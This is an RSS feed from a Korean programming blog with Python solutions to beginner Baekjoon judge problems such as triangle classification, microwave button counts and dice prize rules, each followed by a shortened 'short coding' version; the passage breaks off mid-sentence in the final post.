<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>LRTK Blog</title>
    <link>https://lrtk-coder.github.io/</link>
    
    <atom:link href="https://lrtk-coder.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>Coding, Security, IT News 등 정리한 블로그</description>
    <pubDate>Fri, 22 Jan 2021 14:52:33 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>백준 브론즈4 - 10101번 문제</title>
      <link>https://lrtk-coder.github.io/2021/01/22/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-10101%EB%B2%88-%EB%AC%B8%EC%A0%9C/</link>
      <guid>https://lrtk-coder.github.io/2021/01/22/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-10101%EB%B2%88-%EB%AC%B8%EC%A0%9C/</guid>
      <pubDate>Fri, 22 Jan 2021 05:51:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;백준-브론즈4-10101번-문제&quot;&gt;&lt;a href=&quot;#백준-브론즈4-10101번-문제&quot; class=&quot;headerlink&quot; title=&quot;백준 브론즈4 10101번 문제&quot;&gt;&lt;/a&gt;백준 브론즈4 10101번 문제&lt;/h1&gt;&lt;p&gt;창영이는 삼각형의 </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="백준-브론즈4-10101번-문제"><a href="#백준-브론즈4-10101번-문제" class="headerlink" title="백준 브론즈4 10101번 문제"></a>백준 브론즈4 10101번 문제</h1><p>창영이는 삼각형의 종류를 잘 구분하지 못한다. 따라서 프로그램을 이용해 이를 외우려고 한다.<br>삼각형의 세 각을 입력받은 다음,<br>    * 세 각의 크기가 모두 60이면, Equilateral<br>    * 세 각의 합이 180이고, 두 각이 같은 경우에는 Isosceles<br>    * 세 각의 합이 180이고, 같은 각이 없는 경우에는 Scalene<br>    * 세 각의 합이 180이 아닌 경우에는 Error<br>를 출력하는 프로그램을 작성하시오.<br><a href="https://www.acmicpc.net/problem/10101">10101번: 삼각형 외우기</a></p><hr><h2 id="문제풀이"><a href="#문제풀이" class="headerlink" title="문제풀이"></a>문제풀이</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="built_in">sorted</span>(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">open</span>(<span class="number">0</span>))))</span><br><span class="line"><span class="keyword">if</span> a[<span class="number">0</span>]+a[<span class="number">1</span>]+a[<span class="number">2</span>] != <span class="number">180</span>: print(<span class="string">&#x27;Error&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> a[<span class="number">0</span>] &lt; a[<span class="number">1</span>] &lt; a[<span class="number">2</span>]: print(<span class="string">&#x27;Scalene&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> a[<span class="number">0</span>] == a[<span class="number">2</span>]: print(<span class="string">&#x27;Equilateral&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>: print(<span class="string">&#x27;Isosceles&#x27;</span>)</span><br></pre></td></tr></table></figure><p>이번 문제는 삼각형의 3변의 길이를 이용하여 각을 찾는 문제이다.<br>3변의 길이가 같으면, 3개의 각 크기도 같으니 Equilateral<br>2변의 길이가 같으면, 2개의 각 크기도 같으니 Isosceles<br>같은게 없으면, 같은 각도 없으니 Scalene</p><p>코드는 간단하게 작성하였다.<br>이것을 인덱싱을 이용하여 구현하면, 거의 난독화 수준의 코드가 만들어진다.</p><hr><h2 id="숏코딩-문제풀이"><a href="#숏코딩-문제풀이" class="headerlink" title="숏코딩 문제풀이"></a>숏코딩 문제풀이</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="built_in">sorted</span>(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">open</span>(<span class="number">0</span>))))</span><br><span class="line">print([[[<span class="string">&#x27;Isosceles&#x27;</span>, <span class="string">&#x27;Scalene&#x27;</span>][a[<span class="number">0</span>] &lt; a[<span class="number">1</span>] &lt; a[<span class="number">2</span>]], <span class="string">&#x27;Equilateral&#x27;</span>][a[<span class="number">0</span>] == a[<span class="number">2</span>]], <span class="string">&#x27;Error&#x27;</span>][a[<span class="number">0</span>]+a[<span class="number">1</span>]+a[<span class="number">2</span>] != <span class="number">180</span>])</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/">백준</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884/">백준 브론즈4</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/backjoon/">backjoon</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EB%B0%B1%EC%A4%80/">백준</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884/">백준 브론즈4</category>
      
      <category domain="https://lrtk-coder.github.io/tags/backjoon-bronze4/">backjoon bronze4</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/01/22/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-10101%EB%B2%88-%EB%AC%B8%EC%A0%9C/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>백준 브론즈4 - 5532번 문제</title>
      <link>https://lrtk-coder.github.io/2021/01/22/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-5532%EB%B2%88-%EB%AC%B8%EC%A0%9C/</link>
      <guid>https://lrtk-coder.github.io/2021/01/22/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-5532%EB%B2%88-%EB%AC%B8%EC%A0%9C/</guid>
      <pubDate>Fri, 22 Jan 2021 05:49:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;백준-브론즈4-5532번-문제&quot;&gt;&lt;a href=&quot;#백준-브론즈4-5532번-문제&quot; class=&quot;headerlink&quot; title=&quot;백준 브론즈4 5532번 문제&quot;&gt;&lt;/a&gt;백준 브론즈4 5532번 문제&lt;/h1&gt;&lt;p&gt;상근이는 초등학교에 다닐 </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="백준-브론즈4-5532번-문제"><a href="#백준-브론즈4-5532번-문제" class="headerlink" title="백준 브론즈4 5532번 문제"></a>백준 브론즈4 5532번 문제</h1><p>상근이는 초등학교에 다닐 때, 방학 숙제를 남들보다 먼저 미리 하고 남은 기간을 놀았다. 방학 숙제는 수학과 국어 문제 풀기이다.<br>방학은 총 L일이다. 수학은 총 B페이지, 국어는 총 A페이지를 풀어야 한다. 상근이는 하루에 국어를 최대 C페이지, 수학을 최대 D페이지 풀 수 있다.<br>상근이가 겨울 방학동안 숙제를 하지 않고 놀 수 있는 최대 날의 수를 구하는 프로그램을 작성하시오.<br><a href="https://www.acmicpc.net/problem/5532">5532번: 방학 숙제</a></p><hr><h2 id="문제풀이"><a href="#문제풀이" class="headerlink" title="문제풀이"></a>문제풀이</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">open</span>(<span class="number">0</span>)))</span><br><span class="line">print(a[<span class="number">0</span>] - <span class="built_in">max</span>([a[<span class="number">1</span>]//a[<span class="number">3</span>], a[<span class="number">1</span>]//a[<span class="number">3</span>]+<span class="number">1</span>][a[<span class="number">1</span>]%a[<span class="number">3</span>]!=<span class="number">0</span>], [a[<span class="number">2</span>]//a[<span class="number">4</span>], a[<span class="number">2</span>]//a[<span class="number">4</span>]+<span class="number">1</span>][a[<span class="number">2</span>]%a[<span class="number">4</span>]!=<span class="number">0</span>]))</span><br></pre></td></tr></table></figure><p>사칙연산과 인덱싱을 이용한 문제풀이다.<br>하지만 엄청 가독성이 떨어진다. Math 라이브러리를 이용하여 간단하게 수정하겠다.<br>위 코드가 이해가 안 간다면, 10162번 문제풀이를 참고.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line">a = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">open</span>(<span class="number">0</span>)))</span><br><span class="line">print(a[<span class="number">0</span>] - <span class="built_in">max</span>(math.ceil(a[<span class="number">1</span>]/a[<span class="number">3</span>]), math.ceil(a[<span class="number">2</span>]/a[<span class="number">4</span>])))</span><br></pre></td></tr></table></figure><p>Math 라이브러리(수학 관련 라이브러리)의 Ceil 함수를 이용하여 간편하게 풀이하였다.<br>Ceil 함수는 소수점이 있을 경우 올림을 해주는 함수이다. 이 기능을 이용하여 쓸데없는 인덱싱을 안 쓸 수 있었다.</p><hr><h2 id="숏코딩-문제풀이"><a href="#숏코딩-문제풀이" class="headerlink" title="숏코딩 문제풀이"></a>숏코딩 문제풀이</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">open</span>(<span class="number">0</span>)))</span><br><span class="line">print(a[<span class="number">0</span>]+<span class="built_in">min</span>(-a[<span class="number">1</span>]//a[<span class="number">3</span>],-a[<span class="number">2</span>]//a[<span class="number">4</span>]))</span><br></pre></td></tr></table></figure><p>이 코드는 기본 문제풀이와 같은 원리이지만, 추가적인 기능을 이용하였다.<br>파이썬의 경우 음수일 경우 나눈 나머지는 올림처리가 된다는 것이다.<br>양수에선 25 // 6은 4이지만, -25 // 6은 -5이다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/">백준</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884/">백준 브론즈4</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/backjoon/">backjoon</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EB%B0%B1%EC%A4%80/">백준</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884/">백준 브론즈4</category>
      
      <category domain="https://lrtk-coder.github.io/tags/backjoon-bronze4/">backjoon bronze4</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/01/22/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-5532%EB%B2%88-%EB%AC%B8%EC%A0%9C/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>백준 브론즈4 - 10162번 문제</title>
      <link>https://lrtk-coder.github.io/2021/01/22/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-10162%EB%B2%88-%EB%AC%B8%EC%A0%9C/</link>
      <guid>https://lrtk-coder.github.io/2021/01/22/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-10162%EB%B2%88-%EB%AC%B8%EC%A0%9C/</guid>
      <pubDate>Fri, 22 Jan 2021 05:46:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;백준-브론즈4-10162번-문제&quot;&gt;&lt;a href=&quot;#백준-브론즈4-10162번-문제&quot; class=&quot;headerlink&quot; title=&quot;백준 브론즈4 10162번 문제&quot;&gt;&lt;/a&gt;백준 브론즈4 10162번 문제&lt;/h1&gt;&lt;p&gt;3개의 시간조절용 </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="백준-브론즈4-10162번-문제"><a href="#백준-브론즈4-10162번-문제" class="headerlink" title="백준 브론즈4 10162번 문제"></a>백준 브론즈4 10162번 문제</h1><p>3개의 시간조절용 버튼 A B C가 달린 전자레인지가 있다. 각 버튼마다 일정한 시간이 지정되어 있어 해당 버튼을 한번 누를 때마다 그 시간이 동작시간에 더해진다. 버튼 A, B, C에 지정된 시간은 각각 5분, 1분, 10초이다.<br><img src="https://onlinejudgeimages.s3-ap-northeast-1.amazonaws.com/upload/images/range.png"><br>냉동음식마다 전자레인지로 요리해야할 시간 T가 초단위로 표시되어 있다. 우리는 A, B, C 3개의 버튼을 적절히 눌러서 그 시간의 합이 정확히 T초가 되도록 해야 한다. 단 버튼 A, B, C를 누른 횟수의 합은 항상 최소가 되어야 한다. 이것을 최소버튼 조작이라고 한다.<br>만일 요리시간이 100초라고 하면(T=100) B를 1번, C는 4번 누르면 된다. 이와 다르게 C를 10번 눌러도 100초가 되지만 이 경우 10번은 최소 횟수가 아니기 때문이 답이 될 수 없다. 이 경우 B 1번, C 4번, 총 5번이 최소버튼 조작이다. 그리고 T=234와 같이 3개의 버튼으로 시간을 정확히 맞출 수 없는 경우도 있다.<br>여러분은 주어진 요리시간 T초를 맞추기 위한 최소버튼 조작 방법을 구하는 프로그램을 작성해야 한다.<br><a href="https://www.acmicpc.net/problem/10162">10162번: 전자레인지</a></p><hr><h2 id="문제풀이"><a href="#문제풀이" class="headerlink" title="문제풀이"></a>문제풀이</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">t = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line">a = t//<span class="number">300</span></span><br><span class="line">n = t%<span class="number">300</span></span><br><span class="line"></span><br><span class="line">b = n//<span class="number">60</span></span><br><span class="line">n = n%<span class="number">60</span></span><br><span class="line"></span><br><span class="line">c = n//<span class="number">10</span></span><br><span class="line">n = n%<span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (n!=<span class="number">0</span>): print(<span class="number">-1</span>)</span><br><span class="line"><span class="keyword">else</span>: print(a, b, c)</span><br></pre></td></tr></table></figure><p>기본적인 사칙 연산과 조건문을 이용하여 문제풀이를 하였다.<br>a, b, c는 각각 5분, 1분, 10초라는 시간이 지정되어 있다. 초 단위로 변환을 하면<br>300, 60, 10로 변환이 가능하다.</p><p>최소 횟수를 구하기 위해서는 큰 숫자 순으로 나누기를 하고, 나머지를 넘겨주어 나누어줬다.</p><p>만약 c까지 나누고, 나머지가 0이 아닌 경우는 답이 나올 수 없는 시간이라 -1를 출력하였다.</p><hr><h2 id="숏코딩-문제풀이"><a href="#숏코딩-문제풀이" class="headerlink" title="숏코딩 문제풀이"></a>숏코딩 문제풀이</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">n=<span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">print(*[[<span class="number">-1</span>],[n//<span class="number">300</span>,n%<span class="number">300</span>//<span class="number">60</span>,n%<span class="number">300</span>%<span class="number">60</span>//<span class="number">10</span>]][n%<span class="number">10</span>&lt;<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>기본 문제풀이와 같은 방식으로 진행이 되어지만, 추가적으로 인덱싱을 이용하여 코드를 간편화 시켰다.</p><p><code>[[-1],[n//300,n%300//60,n%300%60//10]]</code>은 기본 문제풀이를 참고하면 된다.<br><code>[n%10&lt;1]</code>은 c까지 나눈 나머지가 0이 아닌 경우를 False, 0이면 True 값을 이용하여 인덱싱을 하였다.</p><p>여기서 왜 10을 나눈 나머지를 이용하는가에 대한 의문을 가질 수 도 있다.<br>이유는 c가 10이기 때문이다. 마지막 c로 나눈 나머지가 0이 아니면 그 값은 a,b,c로 조합하여 나올 수 없는 값이다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/">백준</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884/">백준 브론즈4</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/backjoon/">backjoon</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EB%B0%B1%EC%A4%80/">백준</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884/">백준 브론즈4</category>
      
      <category domain="https://lrtk-coder.github.io/tags/backjoon-bronze4/">backjoon bronze4</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/01/22/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-10162%EB%B2%88-%EB%AC%B8%EC%A0%9C/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>백준 브론즈4 - 2530번 문제</title>
      <link>https://lrtk-coder.github.io/2021/01/22/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-2530%EB%B2%88-%EB%AC%B8%EC%A0%9C/</link>
      <guid>https://lrtk-coder.github.io/2021/01/22/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-2530%EB%B2%88-%EB%AC%B8%EC%A0%9C/</guid>
      <pubDate>Fri, 22 Jan 2021 05:45:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;백준-브론즈4-2530번-문제&quot;&gt;&lt;a href=&quot;#백준-브론즈4-2530번-문제&quot; class=&quot;headerlink&quot; title=&quot;백준 브론즈4 2530번 문제&quot;&gt;&lt;/a&gt;백준 브론즈4 2530번 문제&lt;/h1&gt;&lt;p&gt;KOI 전자에서는 건강에 </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="백준-브론즈4-2530번-문제"><a href="#백준-브론즈4-2530번-문제" class="headerlink" title="백준 브론즈4 2530번 문제"></a>백준 브론즈4 2530번 문제</h1><p>KOI 전자에서는 건강에 좋고 맛있는 훈제오리구이 요리를 간편하게 만드는 인공지능 오븐을 개발하려고 한다. 인공지능 오븐을 사용하는 방법은 적당한 양의 오리 훈제 재료를 인공지능 오븐에 넣으면 된다. 그러면 인공지능 오븐은 오븐구이가 끝나는 시간을 초 단위로 자동적으로 계산한다.<br>또한, KOI 전자의 인공지능 오븐 앞면에는 사용자에게 훈제오리구이 요리가 끝나는 시각을 알려 주는 디지털 시계가 있다.<br>훈제오리구이를 시작하는 시각과 오븐구이를 하는 데 필요한 시간이 초 단위로 주어졌을 때, 오븐구이가 끝나는 시각을 계산하는 프로그램을 작성하시오.<br><a href="https://www.acmicpc.net/problem/2530">2530번: 인공지능 시계</a></p><hr><h2 id="문제풀이"><a href="#문제풀이" class="headerlink" title="문제풀이"></a>문제풀이</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a, b, c = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())</span><br><span class="line">d = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">e = a * <span class="number">3600</span> + b * <span class="number">60</span> + c + d</span><br><span class="line">print(e//<span class="number">3600</span>%<span class="number">24</span>, e//<span class="number">60</span>%<span class="number">60</span>, e%<span class="number">60</span>)</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/">백준</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884/">백준 브론즈4</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/backjoon/">backjoon</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EB%B0%B1%EC%A4%80/">백준</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884/">백준 브론즈4</category>
      
      <category domain="https://lrtk-coder.github.io/tags/backjoon-bronze4/">backjoon bronze4</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/01/22/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-2530%EB%B2%88-%EB%AC%B8%EC%A0%9C/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>백준 브론즈4 - 2420번 문제</title>
      <link>https://lrtk-coder.github.io/2021/01/22/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-2420%EB%B2%88-%EB%AC%B8%EC%A0%9C/</link>
      <guid>https://lrtk-coder.github.io/2021/01/22/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-2420%EB%B2%88-%EB%AC%B8%EC%A0%9C/</guid>
      <pubDate>Fri, 22 Jan 2021 05:43:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;백준-브론즈4-2420번-문제&quot;&gt;&lt;a href=&quot;#백준-브론즈4-2420번-문제&quot; class=&quot;headerlink&quot; title=&quot;백준 브론즈4 2420번 문제&quot;&gt;&lt;/a&gt;백준 브론즈4 2420번 문제&lt;/h1&gt;&lt;p&gt;사파리월드는 인터넷으로만 </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="백준-브론즈4-2420번-문제"><a href="#백준-브론즈4-2420번-문제" class="headerlink" title="백준 브론즈4 2420번 문제"></a>백준 브론즈4 2420번 문제</h1><p>사파리월드는 인터넷으로만 존재하는 미스테리한 나라이다. 사파리월드에는 2개의 서브도메인이 seunghwan.royal.gov.sw와 kyuhyun.royal.gov.sw 이 있는데, 이것이 couple.royal.gov.sw으로 합쳐질 것이다. 그러나 도메인 관리 센터 SWNIC(센터장: 김동규)에는 엄격한 룰이 있다. 두 서브도메인을 합칠 때, 유명도의 차이가 너무 차이나지 않을 경우에만 두 서브도메인을 결혼시키는 것이다. 서브도메인의 유명도는 정수이다. 두 서브도메인의 유명도가 주어졌을 때, 그 차이를 구하는 프로그램을 작성하시오.<br>Link : <a href="https://www.acmicpc.net/problem/2420">https://www.acmicpc.net/problem/2420</a></p><hr><h2 id="문제풀이"><a href="#문제풀이" class="headerlink" title="문제풀이"></a>문제풀이</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a, b = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())</span><br><span class="line">print(<span class="built_in">abs</span>(a-b))</span><br></pre></td></tr></table></figure><p>Abs 함수를 이용하여 문제 풀이를 하였다.<br>Abs 함수는 절대값을 구하는 함수이다.</p><hr><h2 id="숏코딩-문제풀이"><a href="#숏코딩-문제풀이" class="headerlink" title="숏코딩 문제풀이"></a>숏코딩 문제풀이</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="built_in">abs</span>(<span class="built_in">eval</span>(<span class="built_in">input</span>().replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;-&#x27;</span>))))</span><br></pre></td></tr></table></figure><p>Eval 함수와 Replace 함수를 이용하여 문제풀이를 하였다.<br>Eval 함수는 ::-2–5::라는 문자열을 받아서 계산할 것이다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/">백준</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884/">백준 브론즈4</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/backjoon/">backjoon</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EB%B0%B1%EC%A4%80/">백준</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884/">백준 브론즈4</category>
      
      <category domain="https://lrtk-coder.github.io/tags/backjoon-bronze4/">backjoon bronze4</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/01/22/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-2420%EB%B2%88-%EB%AC%B8%EC%A0%9C/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>백준 브론즈4 - 2480번 문제</title>
      <link>https://lrtk-coder.github.io/2021/01/22/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-2480%EB%B2%88-%EB%AC%B8%EC%A0%9C/</link>
      <guid>https://lrtk-coder.github.io/2021/01/22/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-2480%EB%B2%88-%EB%AC%B8%EC%A0%9C/</guid>
      <pubDate>Fri, 22 Jan 2021 05:42:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;백준-브론즈4-2480번-문제&quot;&gt;&lt;a href=&quot;#백준-브론즈4-2480번-문제&quot; class=&quot;headerlink&quot; title=&quot;백준 브론즈4 2480번 문제&quot;&gt;&lt;/a&gt;백준 브론즈4 2480번 문제&lt;/h1&gt;&lt;p&gt;1에서부터 6까지의 눈을 </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="백준-브론즈4-2480번-문제"><a href="#백준-브론즈4-2480번-문제" class="headerlink" title="백준 브론즈4 2480번 문제"></a>백준 브론즈4 2480번 문제</h1><p>1에서부터 6까지의 눈을 가진 3개의 주사위를 던져서 다음과 같은 규칙에 따라 상금을 받는 게임이 있다.<br>    1. 같은 눈이 3개가 나오면 10,000원+(같은 눈)<em>1,000원의 상금을 받게 된다.<br>    2. 같은 눈이 2개만 나오는 경우에는 1,000원+(같은 눈)*100원의 상금을 받게 된다.<br>    3. 모두 다른 눈이 나오는 경우에는 (그 중 가장 큰 눈)*100원의 상금을 받게 된다.<br>예를 들어, 3개의 눈 3, 3, 6이 주어지면 상금은 1,000+3</em>100으로 계산되어 1,300원을 받게 된다. 또 3개의 눈이 2, 2, 2로 주어지면 10,000+2<em>1,000 으로 계산되어 12,000원을 받게 된다. 3개의 눈이 6, 2, 5로 주어지면 그중 가장 큰 값이 6이므로 6</em>100으로 계산되어 600원을 상금으로 받게 된다.<br>3개 주사위의 나온 눈이 주어질 때, 상금을 계산하는 프로그램을 작성 하시오.</p><hr><h2 id="문제풀이"><a href="#문제풀이" class="headerlink" title="문제풀이"></a>문제풀이</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split()))</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">set</span>(a)) == <span class="number">3</span>: print(<span class="built_in">max</span>(a) * <span class="number">100</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">len</span>(<span class="built_in">set</span>(a)) == <span class="number">2</span>: </span><br><span class="line">    <span class="keyword">if</span> a.count(a[<span class="number">0</span>]) == <span class="number">1</span>: print(<span class="number">1000</span> + a[<span class="number">1</span>] * <span class="number">100</span>)</span><br><span class="line">    <span class="keyword">else</span>: print(<span class="number">1000</span> + a[<span class="number">0</span>] * <span class="number">100</span>)</span><br><span class="line"><span class="keyword">else</span>: print(<span class="number">10000</span> + a[<span class="number">0</span>] * <span class="number">1000</span>)</span><br></pre></td></tr></table></figure><p>Set 함수로 중복된 숫자를 제거하고, Len 